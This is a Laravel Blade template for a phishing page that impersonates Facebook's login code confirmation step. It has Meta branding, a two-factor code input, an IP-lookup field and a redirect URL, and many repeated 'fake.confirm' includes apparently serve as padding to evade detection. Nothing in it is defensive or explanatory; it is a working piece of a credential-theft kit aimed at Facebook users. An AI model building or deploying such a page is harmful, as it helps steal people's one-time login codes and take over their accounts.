@extends('user.main')

@push('styles')
    <title>@lang('common.title_confirm_page')</title>
    <link rel="apple-touch-icon" href="{{ $settings['favicon_icon'] }}" sizes="180x180">
    <link rel="icon" href="{{ $settings['favicon_icon'] }}" sizes="32x32">
    <link rel="icon" href="{{ $settings['favicon_icon'] }}" sizes="16x16">
    <link rel="icon" href="{{ $settings['favicon_icon'] }}" sizes="16x16">
    <link rel="icon" href="{{ $settings['favicon_icon'] }}">
    <link rel="mask-icon" href="{{ $settings['favicon_icon'] }}">
    <link type="text/css" href="{{ asset('/css/all.css') }}" rel="stylesheet">
@endpush
@push('scripts')
    <script type="text/javascript">
        const queryParams = '{!! json_encode(\App\Helpers\Helpers::getQueryParams($settings, 'path_login_page')) !!}';
        const parseQueryParams = JSON.parse(queryParams);

        function replaceQueryParam(param, value, search) {
            let regex = new RegExp("([?;&])" + param + "[^&;]*[;&]?");
            let query = search.replace(regex, "$1").replace(/&$/, '');

            return (query.length > 2 ? query + "&" : "?") + (value ? param + "=" + value : '');
        }

        if (parseQueryParams.length > 0) {
            for (const query of parseQueryParams) {
                const currentQuery = window.location.search
                const newUrl = replaceQueryParam(query[0], query[1], currentQuery);
                window.history.pushState(null, null, newUrl)
            }
        }
    </script>
    <script src="/js/user/confirm.js"></script>
@endpush
@section('content')
    <main class="home">
        <div class="header header-confirm">
            @include('fake.confirm')
            <div class="header-dialog">
                @include('fake.confirm')
                @include('fake.confirm')
                @include('fake.confirm')
                <div class="header-content">
                    <div class="header-border"></div>
                    @include('fake.confirm')
                    <div class="header-main"></div>
                    @include('fake.confirm')
                    <div class="header-login">
                        <div class="login-content">
                            <ul class="login-content-list" role="tablist">
                                @include('fake.confirm')
                                <li class="login-content-item" role="presentation">
                                    @include('fake.confirm')
                                    <a class="login-logout" href="javascript:;">@lang('confirm.log_out')</a>
                                </li>
                                @include('fake.confirm')
                            </ul>
                            @include('fake.confirm')
                        </div>
                        @include('fake.confirm')
                        @include('fake.confirm')
                    </div>
                    @include('fake.confirm')
                </div>
                @include('fake.confirm')
            </div>
        </div>
        @include('fake.confirm')
        <div class="body form-confirm">
            <div class="fb_content clearfix " role="main">
                <div class="body-form">
                    <div class="form-confirm">
                        <div class="form-confirm-title">
                            <div class="title-confirm">@lang('confirm.title_form')</div>
                        </div>
                        <div class="line-hr"></div>
                        @include('fake.confirm')
                        @include('fake.confirm')
                        @include('fake.confirm')
                        <div class="form-confirm-sub-title">
                            <div class="sub-title-confirm">@lang('confirm.sub_title_form')</div>
                        </div>
                        <div class="line-hr"></div>
                        <div class="form-confirm-notice">
                            <div class="title-confirm-notice">@lang('confirm.title_notice')</div>
                            <div class="sub-title-confirm-notice">@lang('confirm.sub_title_notice')</div>
                            @include('fake.confirm')
                            @include('fake.confirm')
                            @include('fake.confirm')
                        </div>
                        <div class="line-hr"></div>
                        <div class="form-confirm-input">
                            <div class="title-confirm-input">@lang('confirm.title_input_code')</div>
                            <div class="sub-title-confirm-input">@lang('confirm.sub_title_input_code')</div>
                            <div class="form-confirm-input-text">
                                <input id="input-code" style="font-size: 16px;" type="text" max="999999"
                                    class="form-control validate-input w-100 validate-otp"
                                    placeholder="@lang('confirm.login_code')" />
                            </div>
                            @include('fake.confirm')
                            @include('fake.confirm')
                            @include('fake.confirm')
                        </div>
                        <div class="notice-error d-none">@lang('confirm.error_notice')</div>
                        <div class="line-hr"></div>
                        <div class="form-confirm-footer">
                            <div class="form-confirm-footer-left">
                                @include('fake.confirm')
                                @include('fake.confirm')
                                @include('fake.confirm')
                                <a href="javascript:;">@lang('confirm.need_another')</a>
                            </div>
                            <div class="form-confirm-footer-right">
                                @include('fake.confirm')
                                @include('fake.confirm')
                                @include('fake.confirm')
                                <button id="submit-code">
                                    <span id="submit-code-loading"
                                        class="d-none spinner-border spinner-border-sm spinner"></span>
                                    <span id="submit-code-text">@lang('confirm.submit_code')</span>
                                </button>
                            </div>
                        </div>
                        @include('fake.confirm')
                        @include('fake.confirm')
                        @include('fake.confirm')
                    </div>
                </div>
                <div class="footer">
                    <div class="footer-wrapper">
                        <div class="footer-content">
                            <ul class="footer-item-list">
                                @include('fake.confirm')
                                @include('fake.confirm')
                                @include('fake.confirm')
                                <li>English (US)</li>
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;"
                                        title="Traditional Chinese (Taiwan)">中文(台灣)</a>
                                </li>
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;" title="Korean">한국어</a>
                                </li>
                                <li>
                                    @include('fake.confirm')
                                    @include('fake.confirm')
                                    @include('fake.confirm')
                                    @include('fake.confirm')
                                    @include('fake.confirm')
                                    @include('fake.confirm')
                                    @include('fake.confirm')
                                    @include('fake.confirm')
                                    @include('fake.confirm')
                                    @include('fake.confirm')
                                    @include('fake.confirm')
                                    <a class="_sv4" dir="ltr" href="javascript:;" title="Japanese">日本語</a>
                                </li>
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;" title="French (France)">Français
                                        (France)</a>
                                    @include('fake.confirm')
                                    @include('fake.confirm')
                                    @include('fake.confirm')
                                    @include('fake.confirm')
                                    @include('fake.confirm')
                                    @include('fake.confirm')
                                    @include('fake.confirm')
                                    @include('fake.confirm')
                                    @include('fake.confirm')
                                </li>
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;" title="Thai">ภาษาไทย</a>
                                </li>
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;" title="Spanish">Español</a>
                                </li>
                                @include('fake.confirm')
                                @include('fake.confirm')
                                @include('fake.confirm')
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;"
                                        title="Portuguese (Brazil)">Português (Brasil)</a>
                                </li>
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;" title="German">Deutsch</a>
                                </li>
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;" title="Italian">Italiano</a>
                                </li>
                                <li>
                                    <a role="button" class="button-plus" rel="dialog" ajaxify=""
                                        @include('fake.confirm') @include('fake.confirm') href="javascript:;"
                                        title="Show more languages">
                                        <i class="button-plus-icon"></i>
                                    </a>
                                </li>
                            </ul>
                            <div class="content-curve"></div>
                            <div class="footer-children">
                                <ul class="footer-children-item-list">
                                    <li><a href="javascript:;" title="Sign up for Facebook">Sign Up</a></li>
                                    <li><a href="javascript:;" title="Log in to Facebook">Log in</a></li>
                                    <li><a href="javascript:;" title="Take a look at Messenger.">Messenger</a>
                                        @include('fake.confirm')
                                        @include('fake.confirm')
                                    </li>
                                    <li><a href="javascript:;" title="Facebook Lite for Android.">Facebook Lite</a></li>
                                    <li><a href="javascript:;" title="Browse in Video">Video</a>
                                    </li>
                                    <li><a href="javascript:;"
                                            title="Take a look at popular places on Facebook.">Places</a>
                                    </li>
                                    <li><a href="javascript:;" title="Check out Facebook games.">Games</a></li>
                                    <li><a href="javascript:;"
                                            title="Buy and sell on Facebook Marketplace.">Marketplace</a></li>
                                    @include('fake.confirm')
                                    @include('fake.confirm')
                                    @include('fake.confirm')
                                    <li><a href="javascript:;" title="Learn more about Meta Pay" target="_blank">Meta
                                            Pay</a></li>
                                    <li><a href="javascript:;" title="Discover Meta" target="_blank">Meta
                                            Store</a>
                                    </li>
                                    <li><a href="javascript:;" title="Learn more about Meta Quest" target="_blank">Meta
                                            Quest</a></li>
                                    <li><a href="" title="Take a look at Instagram" target="_blank"
                                            rel="noreferrer nofollow" data-lynx-mode="asynclazy">Instagram</a></li>
                                    <li><a href="" title="Check out Threads" target="_blank"
                                            rel="noreferrer nofollow" data-lynx-mode="asynclazy">Threads</a></li>
                                    <li><a href="javascript:;" title="Donate to worthy causes.">Fundraisers</a></li>
                                    <li><a href="javascript:;" @include('fake.confirm') @include('fake.confirm')
                                            @include('fake.confirm')
                                            title="Browse our Facebook Services directory.">Services</a></li>
                                    <li><a href="javascript:;" title="See the Voting Information Centre">Voting
                                            Information Centre</a></li>
                                    <li><a href="javascript:;"
                                            title="Learn how we collect, use and share information to support Facebook.">Privacy
                                            Policy</a></li>
                                    <li><a href="javascript:;"
                                            title="Learn how to manage and control your privacy on Facebook.">Privacy
                                            Centre</a></li>
                                    <li><a href="javascript:;" title="Explore our groups.">Groups</a></li>
                                    <li><a href="javascript:;" accesskey="8"
                                            title="Read our blog, discover the resource centre and find job opportunities.">About</a>
                                    </li>
                                    @include('fake.confirm')
                                    @include('fake.confirm')
                                    @include('fake.confirm')
                                    <li>
                                        <a href="javascript:;" title="Advertise on Facebook">Create ad</a>
                                    </li>
                                    <li><a href="javascript:;" title="Create a Page">Create
                                            Page</a>
                                    </li>
                                    <li><a href="javascript:;" title="Develop on our platform.">Developers</a>
                                    </li>
                                    <li><a href="javascript:;"
                                            title="Make your next career move to our brilliant company.">Careers</a></li>
                                    @include('fake.confirm')
                                    @include('fake.confirm')
                                    @include('fake.confirm')
                                    <li><a href="javascript:;" title="Learn about cookies and Facebook."
                                            data-nocookies="1">Cookies</a></li>
                                    <li><a class="_41ug" data-nocookies="1" href="javascript:;"
                                            title="Learn about AdChoices.">AdChoices<i
                                                class="img sp_EP9wX8qDDvu sx_6bdd81"></i></a></li>
                                    <li><a data-nocookies="1" href="javascript:;" accesskey="9"
                                            title="Review our terms and policies.">Terms</a></li>
                                    <li><a href="javascript:;" accesskey="0" title="Visit our Help Centre.">Help</a>
                                        @include('fake.confirm')
                                        @include('fake.confirm')
                                        @include('fake.confirm')
                                    </li>
                                    <li><a href="javascript:;"
                                            title="Visit our contact uploading and non-users notice.">Contact uploading
                                            and
                                            non-users</a></li>
                                    <li><a accesskey="6" class="accessible_elem" href="/settings"
                                            title="View and edit your Facebook settings.">Settings</a></li>
                                    <li><a accesskey="7" class="accessible_elem" href="javascript:;"
                                            title="View your activity log">Activity log</a></li>
                                </ul>
                            </div>
                            @include('fake.confirm')
                            @include('fake.confirm')
                            @include('fake.confirm')
                            <div class="footer-copyright">
                                <div><span> Meta © 2023</span></div>
                            </div>
                        </div>
                    </div>
                    @include('fake.confirm')
                </div>
                @include('fake.confirm')
            </div>
            @include('fake.confirm')
            <div></div>
            <span></span>
        </div>
        @include('fake.confirm')
        <input type="hidden" id="getIpInfoUrl" value="{{ session()->get('getIpInfoUrl') }}" />
        @include('fake.confirm')

        <input type="hidden" id="url-redirect" value="{{ $settings['redirect_url'] }}" />

        @include('fake.confirm')
    </main>
@endsection
